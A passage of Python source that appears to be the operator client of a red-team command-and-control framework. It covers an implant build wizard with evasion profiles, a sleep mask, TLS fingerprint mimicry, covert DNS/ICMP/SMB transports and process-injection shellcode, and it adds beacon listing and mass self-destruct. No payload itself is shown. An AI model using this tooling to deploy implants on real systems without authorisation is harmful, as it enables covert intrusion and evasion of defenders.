            the wizard reports the path rather than prompting
            for it. The local console on the team server host is
            unrestricted; a remote build is not.
            """
            print(f"    {c['dim']}Every SMB and TCP build — "
                f"parent or child — reads the same engagement-"
                f"wide keypair from "
                f"{c['reset']}{c['cyan']}mtls_certs/pivot.pem"
                f"{c['reset']}{c['dim']} on the team server. "
                f"If the file does not exist yet, ask the team "
                f"server administrator to run "
                f"`beacon-build --pivot-key-gen` on the server "
                f"console.{c['reset']}")
            return 'mtls_certs/pivot.pem'

        def section_identity_role(state):
            """Optional disambiguator, mixed into the server's
            session fingerprint.

            Two agents built from the same tree that run on the
            same host under the same user report identical
            (machine_id, hostname, username, os) tuples and would
            resolve to one session — one cookie, one task queue,
            one row in the beacon list. Setting a role gives each
            its own.

            The builder already defaults the role for the three
            pivot child transports ('smb-child', 'tcp-bind',
            'tcp-rev'). Leave the prompt blank to accept that
            default. Set an explicit value only when a pivot child
            needs a name other than the transport default, or when
            two non-pivot builds will run side by side on the same
            host under the same user.
            """
            print(f"    {c['dim']}leave blank to use the builder's "
                f"transport default:{c['reset']}")
            print(f"      {c['cyan']}smb     → smb-child{c['reset']}")
            print(f"      {c['cyan']}tcp     → tcp-bind{c['reset']}")
            print(f"      {c['cyan']}tcprev  → tcp-rev{c['reset']}")
            print(f"      {c['dim']}every other transport → empty"
                f"{c['reset']}")
            print(f"    {c['dim']}set an explicit value only when two "
                f"agents will run on the same host under the same "
                f"user and must appear as two beacons. The role "
                f"travels in its own wire field — the beacon list "
                f"still shows the machine's real hostname."
                f"{c['reset']}")
            v = ask('Identity role (blank = transport default)', '')
            if v in ('BACK', 'CANCEL'):
                return v
            return v.strip()

        def section_opsec(state):
            return choose(
                'OPSEC profile',
                [
                    ('default', 'default',
                    'no evasion — lab testing only'),
                    ('stealth', 'stealth',
                    'string obfuscation — standard engagements'),
                    ('opsec', 'opsec',
                    'full suite; needs garble on the server'),
                    ('paranoid', 'paranoid',
                    'opsec plus UPX and the ekko sleep mask'),
                ], 0)

        def section_c2(state):
            try:
                from .beacon.builder import list_c2_profiles
                names = list_c2_profiles()
            except Exception:
                names = []

            modes = state.get('transport', '').split(',')
            dns_only = ('dns' in modes or 'doh' in modes) and not any(
                t in modes for t in ('http', 'quic', 'websocket'))

            if dns_only and 'dns' in names:
                opts = [('dns', 'dns',
                        'verb characters and chunk size for DNS/DoH')]
                opts.append(('', '(handler default)',
                            'the framework default b/t/r layout'))
                opts.extend((n, n, '') for n in names if n != 'dns')
                default_index = 0
                print(f"  {c['dim']}on a DNS or DoH build the profile "
                      f"supplies the three verb characters and the "
                      f"per-chunk payload length. Pick 'dns' unless "
                      f"the listener is dispatching against a "
                      f"different profile, in which case pick the "
                      f"same one.{c['reset']}")
            else:
                opts = [('', '(handler default)',
                        'whatever the listener auto-discovered')]
                opts.extend((n, n, '') for n in names)
                default_index = 1 if names else 0

            return choose('C2 profile', opts, default_index)

        def section_tls(state):
            return choose(
                'TLS ClientHello fingerprint',
                [
                    ('go', 'go',
                    'standard library — pre-utls default'),
                    ('chrome', 'chrome',
                    'Chrome 120 ClientHello via uTLS'),
                    ('firefox', 'firefox',
                    'Firefox 120 ClientHello via uTLS'),
                    ('safari', 'safari',
                    'Safari 16.0 ClientHello via uTLS'),
                ], 0)

        def section_lifecycle(state):
            v = ask('Kill days (0 = no deadline)', '30',
                    validate=_is_nonneg_int)
            if v in ('BACK', 'CANCEL'):
                return v
            state['kill_days'] = int(v)

            v = ask('Work hours (HH:MM-HH:MM or off)',
                    '08:00-19:00')
            if v in ('BACK', 'CANCEL'):
                return v

            def _valid_clock(s):
                try:
                    h, m = s.split(':', 1)
                    return 0 <= int(h) <= 23 and 0 <= int(m) <= 59
                except Exception:
                    return False

            low = v.strip().lower()
            if low in ('off', 'none', 'disable', '00:00-00:00'):
                state['work_hours_start'] = '00:00'
                state['work_hours_end'] = '00:00'
            elif '-' in low:
                a, b = (p.strip() for p in low.split('-', 1))
                if _valid_clock(a) and _valid_clock(b):
                    state['work_hours_start'] = a
                    state['work_hours_end'] = b
                else:
                    print(f"    {c['yellow']}invalid clock — using "
                        f"08:00-19:00{c['reset']}")
                    state['work_hours_start'] = '08:00'
                    state['work_hours_end'] = '19:00'
            else:
                print(f"    {c['yellow']}unrecognised — using "
                    f"08:00-19:00{c['reset']}")
                state['work_hours_start'] = '08:00'
                state['work_hours_end'] = '19:00'

            print(f"    {c['dim']}verbose writes diagnostic lines "
                f"to stderr on the target. Debug builds only — "
                f"it leaves forensic artefacts.{c['reset']}")
            v = ask_yes('Enable verbose stderr on the target?',
                        default=False)
            if v in ('BACK', 'CANCEL'):
                return v
            state['verbose'] = bool(v)
            return None

        def section_mtls(state):
            if state['output_format'] == 'stager':
                state['use_mtls'] = False
                return None
            v = ask_yes(
                'Embed an mTLS client bundle? '
                '(the listener must start with matching '
                '--beacon-mtls-* flags)', default=False)
            if v in ('BACK', 'CANCEL'):
                return v
            state['use_mtls'] = bool(v)
            if not v:
                return None

            d = ask('mTLS directory on the server '
                    '(blank = use cert/key/ca overrides)', '')
            if d in ('BACK', 'CANCEL'):
                return d
            if d:
                state['mtls_dir'] = d
                return None

            for key, prompt in (
                    ('mtls_cert', 'client cert path (blank = default)'),
                    ('mtls_key',  'client key path (blank = default)'),
                    ('mtls_ca',   'root CA path (blank = default)')):
                v = ask(prompt, '')
                if v in ('BACK', 'CANCEL'):
                    return v
                if v:
                    state[key] = v
            return None

        def section_inject(state):
            """Ask whether to embed the injector shellcode.

            Opt-in on both platforms. The wizard does not ask
            whether the build host has Donut or the Linux stub —
            the builder on the server prints a warning and
            produces a pass-1-only binary if the loader is
            missing, which is the same outcome as not enabling
            injection. Asking here keeps the wizard linear.
            """

            if state.get('output_format') == 'stager':
                state['inject'] = False
                return None

            print(f"    {c['dim']}Embeds a loader-wrapped copy of "
                f"the agent as shellcode so `migrate <pid>` can "
                f"inject into a foreign process. Adds roughly "
                f"13 MB to the binary. Without it, only "
                f"`migrate --self` works.{c['reset']}")
            if state.get('os') == 'windows':
                print(f"    {c['dim']}Windows: the server needs "
                    f"Donut on PATH, or a vendored copy at "
                    f"beacon/bin/donut.{c['reset']}")
            else:
                print(f"    {c['dim']}Linux: the server needs the "
                    f"vendored ELF-loader stub at "
                    f"beacon/bin/inject_linux_stub.bin.{c['reset']}")

            v = ask_yes(
                'Enable in-memory injection (migrate <pid>)?',
                default=False)
            if v in ('BACK', 'CANCEL'):
                return v
            state['inject'] = bool(v)
            return None

        def section_confirm(state):
            modes = state['transport'].split(',')

            print(f"\n{c['cyan']}{c['bold']}{'=' * 64}{c['reset']}")
            print(f"{c['cyan']}{c['bold']}  BUILD SUMMARY{c['reset']}")
            print(f"{c['cyan']}{c['bold']}{'=' * 64}{c['reset']}")

            def row(label, value, col=None):
                vcol = col or ''
                tail = c['reset'] if vcol else ''
                print(f"  {c['dim']}{label:<18}{c['reset']}"
                      f"{vcol}{value}{tail}")

            row('target', f"{state['os']}/{state['arch']}")
            row('format', state['output_format'])
            row('transport', state['transport'])

            if 'http' in modes:
                row('url', state.get('url', ''))
                row('c2 profile',
                    state.get('c2_profile') or '(handler default)')
                row('tls fp', state.get('tls_profile', 'go'))
            if 'quic' in modes:
                row('url', state.get('url', ''))
                row('c2 profile',
                    state.get('c2_profile') or '(handler default)')
            if 'websocket' in modes:
                row('url', state.get('url', ''))
                row('c2 profile',
                    state.get('c2_profile') or '(handler default)')
                row('tls fp', state.get('tls_profile', 'go'))
            if 'wireguard' in modes:
                pub = state.get('wireguard_server_pubkey', '')
                row('wg server pubkey',
                    (pub[:24] + '…') if len(pub) > 24 else pub)
                row('wg server addr',
                    state.get('wireguard_server_addr', ''))
                row('wg agent tunnel',
                    state.get('wireguard_tunnel_ip', ''))
                row('wg server tunnel',
                    state.get('wireguard_server_tunnel_ip',
                              '10.99.0.1'))
                row('wg inner port',
                    state.get('wireguard_inner_port', '8881'))
            if 'dns' in modes:
                row('dns zone', state.get('dns_domain', ''))
                if state.get('dns_resolver'):
                    row('dns resolver', state['dns_resolver'])
            if 'doh' in modes:
                row('dns zone', state.get('dns_domain', ''))
                row('doh endpoint', state.get('doh_resolver', ''))
                if state.get('doh_host_header'):
                    row('doh host', state['doh_host_header'])
                row('tls fp', state.get('tls_profile', 'go'))
            if 'icmp' in modes:
                row('icmp target', state.get('icmp_host', ''))
            if 'smb' in modes:
                row('smb pipe', state.get('smb_pipe', ''))
            if 'tcp' in modes:
                row('tcp listen', state.get('tcp_bind_addr', ''))
            if 'tcprev' in modes:
                row('tcp dial', state.get('tcp_rev_target', ''))
            if 'smb' in modes or 'tcp' in modes or 'tcprev' in modes:
                row('c2 profile',
                    state.get('c2_profile') or '(handler default)')
            if state.get('smb_relay_pipe'):
                row('smb relay', state['smb_relay_pipe'])
            if state.get('tcp_relay_target'):
                row('tcp relay', state['tcp_relay_target'])
            if state.get('tcp_rev_listen'):
                row('tcp rev lstn', state['tcp_rev_listen'])
            if _is_pivot(state):
                row('pivot key',
                    state.get('pivot_key_path') or
                    '(none — build will fail)',
                    col=None if state.get('pivot_key_path')
                    else c['red'])
            if len(modes) > 1:
                row('failover after',
                    state.get('transport_failover_after', 3))

            row('opsec', state['opsec_profile'])
            row('kill days', state['kill_days'])
            if state['work_hours_start'] == state['work_hours_end']:
                row('work hours', 'off (24/7)', col=c['yellow'])
            else:
                row('work hours',
                    f"{state['work_hours_start']}-"
                    f"{state['work_hours_end']}")
            row('verbose',
                'yes — debug build' if state.get('verbose')
                else 'no',
                col=c['red'] if state.get('verbose') else None)
            row('mTLS',
                ('yes (' + (state.get('mtls_dir') or 'paths') + ')')
                if state.get('use_mtls') else 'no')
            if state.get('inject'):
                row('injection',
                    'yes — embeds shellcode for migrate <pid> '
                    '(+~13 MB)',
                    col=c['yellow'])
            else:
                row('injection', 'no')
            if state['output_format'] == 'stager':
                row('stage name', state.get('stager_name', ''))

            print()
            try:
                ans = input(
                    f"  {c['green']}▸ Compile on server? "
                    f"[Y/n] {c['dim']}(b=back, q=cancel){c['reset']}: "
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return 'CANCEL'
            if ans in ('q', 'quit', 'cancel', 'n', 'no'):
                return 'CANCEL'
            if ans in ('b', 'back'):
                return 'BACK'
            return None

        # ------------------------------------------------------------------
        # Section table. Each entry: (key, title, function, applies).
        # `applies` is a predicate over accumulated state; a step whose
        # predicate is false is silently skipped.

        def _always(_): return True
        def _stager(s): return s.get('output_format') == 'stager'
        def _has_c2(s):
            """Every transport that carries a C2 body reads some
            part of the profile.

            HTTP, QUIC, and WebSocket read paths, UA, headers,
            and the shaping block. DNS and DoH read only the
            dns_label block — verb characters and chunk size —
            but they still need the profile embedded so the
            linker flags are emitted. SMB, TCP bind, and TCP
            reverse pivot children read the shaping block, because
            the shaped body travels inside the child's own wire
            envelope and only the child can unwrap what the
            server sends back.
            """
            m = s.get('transport', '').split(',')
            return any(t in m for t in
                       ('http', 'quic', 'websocket', 'dns', 'doh',
                        'smb', 'tcp', 'tcprev'))
        def _has_tls(s):
            m = s.get('transport', '').split(',')
            return 'http' in m or 'doh' in m or 'websocket' in m

        def _is_pivot(s):
            """True when this build is a pivot listener or a
            pivot client. Either side reads the engagement-wide
            pivot keypair file at build time; the builder picks
            the half the role needs. Non-pivot builds never
            touch it, and the prompt is hidden so an operator
            on a plain HTTP or DNS build is never asked."""
            m = s.get('transport', '').split(',')
            if 'smb' in m or 'tcp' in m or 'tcprev' in m:
                return True                     # pivot client
            if s.get('smb_relay_pipe'):
                return True                     # pivot listener
            if s.get('tcp_relay_target'):
                return True                     # pivot listener
            if s.get('tcp_rev_listen'):
                return True                     # pivot listener
            return False

        steps = [
            ('os',            'Target OS',
                section_os,            _always,   '1/9'),
            ('arch',          'Architecture',
                section_arch,          _always,   '2/9'),
            ('output_format', 'Output format',
                section_format,        _always,   '3/9'),
            ('stager_name',   'Stager payload name',
                section_stager_name,   _stager,   '3b/9'),
            ('stager_key',    'Stager AES key',
                section_stager_key,    _stager,   '3c/9'),
            ('transport',     'Transport',
                section_transport,     _always,   '4/9'),
            (None,            'Transport options',
                section_transport_opts, _always,  '4b/9'),
            ('pivot_key_path', 'Pivot keypair',
                section_pivot_key,     _is_pivot, '4e/9'),
            ('identity_role', 'Identity role',
                section_identity_role, _always,   '4f/9'),
            (None,            'Endpoint',
                section_endpoint,      _always,   '5/9'),
            ('opsec_profile', 'OPSEC profile',
                section_opsec,         _always,   '6/9'),
            ('c2_profile',    'C2 profile',
                section_c2,            _has_c2,  '7/9'),
            ('tls_profile',   'TLS fingerprint',
                section_tls,           _has_tls,  '8/9'),
            (None,            'Lifecycle',
                section_lifecycle,     _always,   '9/9'),
            (None,            'mTLS',
                section_mtls,          _always,   '9b/9'),
            (None,            'In-memory injection',
                section_inject,        _always,   '9c/9'),
            (None,            'Confirm',
                section_confirm,       _always,   ''),
        ]

        # ------------------------------------------------------------------
        # Run.

        print(f"\n{c['cyan']}{c['bold']}{'=' * 64}{c['reset']}")
        print(f"{c['cyan']}{c['bold']}  REMOTE AGENT BUILDER"
              f"{c['reset']}")
        print(f"{c['cyan']}{c['bold']}{'=' * 64}{c['reset']}")
        print(f"  {c['dim']}The team server compiles the binary and "
              f"streams it back.{c['reset']}")
        print(f"  {c['dim']}At every prompt: {c['reset']}"
              f"{c['green']}▸{c['reset']}{c['dim']} accepts the "
              f"default, "
              f"{c['reset']}{c['cyan']}b{c['reset']}{c['dim']} goes "
              f"back, "
              f"{c['reset']}{c['cyan']}q{c['reset']}{c['dim']} "
              f"cancels.{c['reset']}")
        print()

        state = {}
        i = 0
        while i < len(steps):
            key, title, fn, applies, marker = steps[i]
            if not applies(state):
                i += 1
                continue

            if marker:
                print(f"\n{c['cyan']}{c['bold']}"
                      f"[{marker}]{c['reset']}  "
                      f"{c['cyan']}{c['bold']}{title}{c['reset']}")
            else:
                print(f"\n{c['cyan']}{c['bold']}{title}{c['reset']}")

            crumbs = [state[k] for k in ('os', 'arch', 'output_format',
                                        'transport') if k in state]
            if crumbs:
                print(f"  {c['dim']}{' · '.join(crumbs)}{c['reset']}")

            result = fn(state)

            if result == 'CANCEL':
                print(f"\n{c['yellow']}build cancelled{c['reset']}")
                return None

            if result == 'BACK':
                j = i - 1
                while j >= 0 and not steps[j][3](state):
                    j -= 1
                if j < 0:
                    print(f"    {c['yellow']}at the first section"
                        f"{c['reset']}")
                    continue
                for k in range(j, len(steps)):
                    bk = steps[k][0]
                    if bk:
                        state.pop(bk, None)
                for tk in ('smb_pipe', 'smb_relay_pipe',
                        'tcp_bind_addr', 'tcp_bind_token',
                        'tcp_relay_target', 'tcp_relay_token',
                        'tcp_rev_listen', 'tcp_rev_target',
                        'tcp_rev_token',
                        'pivot_key_path',
                        'transport_failover_after',
                        'url', 'dns_domain', 'dns_resolver',
                        'doh_resolver', 'doh_host_header',
                        'icmp_host',
                        'wireguard_server_pubkey',
                        'wireguard_server_addr',
                        'wireguard_agent_privkey',
                        'wireguard_tunnel_ip',
                        'wireguard_server_tunnel_ip',
                        'wireguard_inner_port',
                        'kill_days', 'work_hours_start',
                        'work_hours_end', 'verbose',
                        'use_mtls', 'mtls_dir', 'mtls_cert',
                        'mtls_key', 'mtls_ca',
                        'inject'):
                    state.pop(tk, None)
                i = j
                continue

            if key is not None:
                state[key] = result
            i += 1

        # ------------------------------------------------------------------
        # Assemble the payload the server's _load_build_config expects.

        modes = state['transport'].split(',')
        payload = {
            'opsec_profile':    state['opsec_profile'],
            'target_os':        state['os'],
            'target_arch':      state['arch'],
            'output_format':    state['output_format'],
            'transport_mode':   state['transport'],
            'kill_days':        state['kill_days'],
            'work_hours_start': state['work_hours_start'],
            'work_hours_end':   state['work_hours_end'],
            'verbose':          bool(state.get('verbose', False)),
        }

        if state.get('c2_profile'):
            payload['c2_profile'] = state['c2_profile']

        if ('http' in modes or 'quic' in modes
                or 'websocket' in modes):
            payload['url'] = state['url']
        if any(t in modes for t in ('http', 'websocket', 'doh')):
            payload['tls_profile'] = state.get('tls_profile', 'go')
        if 'wireguard' in modes:
            payload['wireguard_server_pubkey'] = (
                state['wireguard_server_pubkey'])
            payload['wireguard_server_addr'] = (
                state['wireguard_server_addr'])
            payload['wireguard_agent_privkey'] = (
                state['wireguard_agent_privkey'])
            payload['wireguard_tunnel_ip'] = (
                state['wireguard_tunnel_ip'])
            payload['wireguard_inner_port'] = (
                state.get('wireguard_inner_port') or '8881')
            payload['wireguard_server_tunnel_ip'] = (
                state.get('wireguard_server_tunnel_ip')
                or '10.99.0.1')
        if 'dns' in modes or 'doh' in modes:
            payload['dns_domain'] = state['dns_domain']
            if state.get('dns_resolver'):
                payload['dns_resolver'] = state['dns_resolver']
        if 'doh' in modes:
            if state.get('doh_resolver'):
                payload['doh_resolver'] = state['doh_resolver']
            if state.get('doh_host_header'):
                payload['doh_host_header'] = state['doh_host_header']
        if 'icmp' in modes:
            payload['icmp_host'] = state['icmp_host']
        if len(modes) > 1:
            payload['transport_failover_after'] = (
                state.get('transport_failover_after', 3))
        if state.get('smb_pipe'):
            payload['smb_pipe'] = state['smb_pipe']
        if state.get('smb_relay_pipe'):
            payload['smb_relay_pipe'] = state['smb_relay_pipe']
        if state.get('tcp_bind_addr'):
            payload['tcp_bind_addr'] = state['tcp_bind_addr']
            payload['tcp_bind_token'] = state['tcp_bind_token']
        if state.get('tcp_relay_target'):
            payload['tcp_relay_target'] = state['tcp_relay_target']
            payload['tcp_relay_token'] = state['tcp_relay_token']
        if state.get('tcp_rev_target'):
            payload['tcp_rev_target'] = state['tcp_rev_target']
            payload['tcp_rev_token'] = state['tcp_rev_token']
        if state.get('tcp_rev_listen'):
            payload['tcp_rev_listen'] = state['tcp_rev_listen']
            payload['tcp_rev_token'] = state['tcp_rev_token']
        if state.get('pivot_key_path'):
            payload['pivot_key_path'] = state['pivot_key_path']
        if state.get('identity_role'):
            payload['identity_role'] = state['identity_role']
        if state['output_format'] == 'stager':
            payload['stage_name'] = state['stager_name']
            if state.get('stager_key'):
                payload['stage_key_hex'] = state['stager_key']
        if state.get('inject'):
            payload['inject'] = True
        if state.get('use_mtls'):
            mtls = {'enabled': True}
            for k in ('mtls_dir', 'mtls_cert', 'mtls_key', 'mtls_ca'):
                if state.get(k):
                    mtls[k[5:]] = state[k]
            payload['mtls'] = mtls

        return payload

    def _do_remote_build(self, payload):
        """Send the config, then pull the binary in chunks."""
        import hashlib as _hl

        print(f"{CLR['cyan']}▸{CLR['reset']} requesting build "
              f"on server…")

        try:
            r = self.tp.post('/api/v1/beacon/build', payload,
                             timeout=300.0)
        except Exception as exc:
            print(f"{CLR['red']}build request failed: {exc}"
                  f"{CLR['reset']}")
            return
        if 'build_id' not in r:
            print(f"{CLR['red']}server rejected build: "
                  f"{r.get('error', r)}{CLR['reset']}")
            return

        build_id = r['build_id']
        filename = r.get('filename') or f'beacon_{build_id}'
        size = int(r.get('size', 0))
        want_sha = (r.get('sha256') or '').lower()

        print(f"{CLR['cyan']}▸{CLR['reset']} server built "
              f"{CLR['cyan']}{filename}{CLR['reset']} "
              f"({size} bytes, sha256 "
              f"{CLR['dim']}{want_sha[:16]}…{CLR['reset']})")

        _here = os.path.dirname(os.path.abspath(__file__))
        repo_root = os.path.dirname(os.path.dirname(_here))
        out_dir = os.path.join(repo_root, 'beacon_output')
        try:
            os.makedirs(out_dir, exist_ok=True)
        except OSError:
            pass
        out_path = os.path.join(out_dir, filename)

        chunk_size = 512 * 1024
        offset = 0
        h = _hl.sha256()
        started = time.time()

        try:
            with open(out_path, 'wb') as fh:
                while offset < size:
                    try:
                        r = self.tp.post(
                            f'/api/v1/beacon/build/{build_id}/chunk',
                            {'offset': offset,
                             'size': chunk_size},
                            timeout=60.0)
                    except Exception as exc:
                        print(f"\r{CLR['red']}chunk fetch failed: "
                              f"{exc}{CLR['reset']}")
                        return
                    import base64 as _b64
                    try:
                        data = _b64.b64decode(r['data'])
                    except Exception:
                        print(f"\r{CLR['red']}bad chunk "
                              f"encoding{CLR['reset']}")
                        return
                    if not data:
                        break
                    fh.write(data)
                    h.update(data)
                    offset += len(data)
                    if sys.stdout.isatty():
                        pct = int(100 * offset / size) if size else 100
                        bar_width = 30
                        filled = int(bar_width * offset / size) \
                                 if size else bar_width
                        bar = '█' * filled + '░' * (bar_width - filled)
                        print(f"\r{CLR['cyan']}[{bar}] {pct}%"
                              f"{CLR['reset']}", end='', flush=True)
        except OSError as exc:
            print(f"\r{CLR['red']}write failed: {exc}{CLR['reset']}")
            return
        if sys.stdout.isatty():
            print()

        got_sha = h.hexdigest()
        if want_sha and got_sha != want_sha:
            print(f"{CLR['red']}sha256 mismatch — refusing to keep "
                  f"the file{CLR['reset']}")
            try:
                os.remove(out_path)
            except OSError:
                pass
            return

        server_cleaned = False
        try:
            r = self.tp.post(
                f'/api/v1/beacon/build/{build_id}/finish', {},
                timeout=10.0)
            server_cleaned = bool(r.get('ok'))
        except Exception:
            pass

        elapsed = int(time.time() - started)
        print(f"{CLR['green']}✓{CLR['reset']} built "
              f"{CLR['cyan']}{out_path}{CLR['reset']} "
              f"({size} bytes, {elapsed}s, sha256 verified)")
        if server_cleaned:
            print(f"{CLR['dim']}server cleaned up the staged "
                  f"build{CLR['reset']}")
        else:
            print(f"{CLR['dim']}server will clean up the staged "
                  f"build on its next sweep{CLR['reset']}")

    # ------------------------------------------------------------------
    # Beacon listing

    def _cmd_killall(self, parts):
        """killall --all | --stale | --tag <tag> | --ids a,b,c

        Queue self-destruct on every matching beacon. Requires
        beacon.use. Every match is confirmed as a group before
        the request is sent; the confirmation names the count
        and lists the first ten.

        This is the "engagement is over" command. It exists so
        the operator does not have to type `kill` once per
        beacon, and so the audit chain records the group
        operation as a single entry rather than N scattered
        ones.
        """
        c = CLR
        if 'beacon.use' not in self.caps:
            print(f"{c['red']}your role does not include "
                  f"beacon.use{c['reset']}")
            return

        scope = None
        extra = {}
        args = parts[1:]
        i = 0
        while i < len(args):
            a = args[i].lower()
            if a == '--all':
                scope = 'all'; i += 1
            elif a == '--stale':
                scope = 'stale'; i += 1
            elif a == '--tag':
                if i + 1 >= len(args):
                    print(f"{c['red']}--tag requires a value"
                          f"{c['reset']}")
                    return
                scope = 'tag'
                extra['tag'] = args[i + 1]
                i += 2
            elif a == '--ids':
                if i + 1 >= len(args):
                    print(f"{c['red']}--ids requires a value"
                          f"{c['reset']}")
                    return
                raw = args[i + 1]
                ids = [x.strip() for x in raw.split(',')
                       if x.strip()]
                scope = 'ids'
                extra['ids'] = ids
                i += 2
            elif a in ('--help', '-h'):
                print(f"usage: killall --all | --stale | "
                      f"--tag <tag> | --ids a,b,c")
                return
            else:
                print(f"{c['red']}unknown flag: {args[i]}"
                      f"{c['reset']}")
                return

        if scope is None:
            print(f"{c['red']}usage: killall --all | --stale | "
                  f"--tag <tag> | --ids a,b,c{c['reset']}")
            return

        try:
            rows = self.tp.post('/api/v1/beacons', {})
            self._beacon_cache = list(rows or [])
            self._beacon_ids = [str(b['id']) for b in rows or []]
        except Exception as exc:
            print(f"{c['red']}could not fetch beacon list: {exc}"
                  f"{c['reset']}")
            return

        def _match(b):
            if scope == 'all':
                return True
            if scope == 'stale':
                return not b.get('alive')
            if scope == 'tag':
                return extra['tag'] in (b.get('tags') or [])
            if scope == 'ids':
                return str(b['id']) in extra['ids']
            return False

        matched = [b for b in self._beacon_cache if _match(b)]

        if not matched:
            print(f"{c['yellow']}no beacons match "
                  f"the requested scope{c['reset']}")
            return

        print()
        print(f"  {c['red']}{c['bold']}this will queue "
              f"self-destruct on {len(matched)} beacon(s):"
              f"{c['reset']}")
        shown = matched[:10]
        for b in shown:
            print(f"    {c['cyan']}#{b['id']:<6}{c['reset']} "
                  f"{b.get('display_name', '?')} "
                  f"({b.get('os', '?')}/{b.get('arch', '')})")
        if len(matched) > len(shown):
            print(f"    {c['dim']}... and "
                  f"{len(matched) - len(shown)} more{c['reset']}")
        print()
        print(f"  {c['yellow']}the kill task is a pull — each "
              f"beacon runs it on its next check-in. A beacon "
              f"that never checks in again is not killed."
              f"{c['reset']}")
        print()
        try:
            ans = input(
                f"  {c['green']}type 'yes' or the count to "
                f"confirm{c['reset']}: "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"{c['dim']}cancelled{c['reset']}")
            return

        if ans not in ('yes', str(len(matched))):
            print(f"{c['dim']}cancelled{c['reset']}")
            return

        payload = {'scope': scope}
        payload.update(extra)
        if scope == 'ids':
            payload['ids'] = [int(x) for x in extra['ids']
                              if x.isdigit()]

        try:
            r = self.tp.post('/api/v1/beacon/kill', payload,
                             timeout=30.0)
        except Exception as exc:
            print(f"{c['red']}killall failed: {exc}"
                  f"{c['reset']}")
            return

        if not r.get('ok'):
            print(f"{c['red']}"
                  f"{r.get('error', 'server refused')}"
                  f"{c['reset']}")
            return

        print(f"{c['green']}✓{c['reset']} queued kill on "
              f"{r.get('killed', 0)}/{r.get('matched', 0)} "
              f"beacon(s)")
        if r.get('failed'):
            print(f"  {c['yellow']}{len(r['failed'])} failed to "
                  f"enqueue: "
                  f"{', '.join('#' + str(x) for x in r['failed'])}"
                  f"{c['reset']}")  

    def _cmd_beacons(self):
        payload = {'current': self.current_beacon}
        try:
            beacons = self.tp.post('/api/v1/beacons', payload)
        except Exception as exc:
            print(f"{CLR['red']}beacons fetch failed: {exc}"
                  f"{CLR['reset']}")
            return

        self._beacon_ids = [str(b['id']) for b in beacons]
        self._beacon_cache = list(beacons)

        c = CLR
        if not beacons:
            print(f"  {c['dim']}no beacons registered{CLR['reset']}")
            return

        beacons = sorted(beacons, key=lambda b: b['id'])
        alive = sum(1 for b in beacons if b['alive'])
        stale = len(beacons) - alive

        _header(f'BEACONS  ·  {alive} alive  ·  {stale} stale')

        W_ID    = 5
        W_NAME  = 24
        W_PLAT  = 14
        W_SLEEP = 7
        W_LAST  = 8
        W_CHK   = 5
        W_VIEW  = 14

        header = (
            f"  {'':2}  "
            f"{'ID':<{W_ID}} "
            f"{'USER@HOST':<{W_NAME}} "
            f"{'PLATFORM':<{W_PLAT}} "
            f"{'SLEEP':>{W_SLEEP}}  "
            f"{'LAST':>{W_LAST}}  "
            f"{'CHK':>{W_CHK}}  "
            f"{'VIEWERS':<{W_VIEW}} "
            f"ADDR"
        )
        print(f"{c['bold']}{header}{c['reset']}")
        _hr(120, '─')

        for b in beacons:
            dot = (f"{c['green']}●{c['reset']}" if b['alive']
                   else f"{c['red']}○{c['reset']}")
            name = (b['display_name'] or '?')[:W_NAME]
            plat = f"{b['os']}/{b['arch']}"[:W_PLAT]
            sleep = f"{b['sleep_interval']}s"
            age = b['last_seen_age']
            if age < 60:
                last = f"{age}s"
            elif age < 3600:
                last = f"{age // 60}m"
            elif age < 86400:
                last = f"{age // 3600}h"
            else:
                last = f"{age // 86400}d"
            chk = str(b['checkins'])
            addr = b.get('last_addr', '') or '—'
            id_col = c['cyan'] if b['alive'] else c['dim']

            viewers = b.get('viewers') or []
            if not viewers:
                view_col = f"{c['dim']}—{c['reset']}"
            elif len(viewers) == 1:
                view_col = (f"{c['cyan']}"
                            f"{viewers[0]['name']}"
                            f"{c['reset']}")
            else:
                names = ', '.join(v['name'] for v in viewers)
                if len(names) > W_VIEW:
                    names = names[:W_VIEW - 1] + '…'
                view_col = (f"{c['yellow']}{names}"
                            f"{c['reset']}")

            print(
                f"  {dot}  "
                f"{id_col}#{b['id']:<{W_ID - 1}}{c['reset']} "
                f"{name:<{W_NAME}} "
                f"{plat:<{W_PLAT}} "
                f"{sleep:>{W_SLEEP}}  "
                f"{last:>{W_LAST}}  "
                f"{chk:>{W_CHK}}  "
                f"{view_col:<{W_VIEW + 20}} "
                f"{c['dim']}{addr}{c['reset']}"
            )
        print()

    def _resolve_alias(self, name):
        """Resolve an alias to a beacon id by looking through the
        beacons cache. Returns the id as an int, or None if no
        beacon carries that alias. Numeric strings are handled by
        the caller and never reach here.
        """
        def _scan(rows):
            for b in rows or []:
                if (b.get('alias') or '') == name:
                    try:
                        return int(b['id'])
                    except (KeyError, TypeError, ValueError):
                        return None
            return None

        found = _scan(getattr(self, '_beacon_cache', []))
        if found is not None:
            return found
        try:
            rows = self.tp.post('/api/v1/beacons', {})
            self._beacon_cache = list(rows or [])
            self._beacon_ids = [str(b['id']) for b in rows or []]
        except Exception:
            return None
        return _scan(self._beacon_cache)

    def _cmd_use(self, parts):
        if len(parts) < 2:
            self._cmd_detach()
            return
        arg = parts[1].strip()
        if arg.isdigit():
            bid = int(arg)
        else:
            bid = self._resolve_alias(arg)
            if bid is None:
                print(f"{CLR['red']}no such beacon or alias: "
                    f"{arg}{CLR['reset']}")
                return
        if bid <= 0:
            print(f"{CLR['red']}invalid beacon id{CLR['reset']}")
            return

        self.current_beacon = bid
        alive = None
        sleep_s = None
        target_os = None

        try:
            beacons = self.tp.post(
                '/api/v1/beacons', {'current': bid})
            self._beacon_cache = list(beacons)
            for b in beacons:
                if b['id'] == bid:
                    alive = b.get('alive')
                    sleep_s = b.get('sleep_interval')
                    target_os = b.get('os')
                    break
        except Exception:
            pass

        if target_os:
            self._load_commands(target_os=target_os)

        if sleep_s is not None:
            self._last_known_sleep = sleep_s

        note = ''
        if alive is True and sleep_s is not None:
            note = (f" {CLR['dim']}— alive, sleep={sleep_s}s, "
                    f"results on next poll{CLR['reset']}")
        elif alive is False:
            note = (f" {CLR['yellow']}— last check-in is stale, "
                    f"commands will queue{CLR['reset']}")
        elif alive is None:
            note = (f" {CLR['dim']}— beacon not in registry yet"
                    f"{CLR['reset']}")

        print(f"attached to {CLR['cyan']}#{bid}{CLR['reset']}{note}")

    def _cmd_detach(self):
        if self.current_beacon is None:
            return

        try:
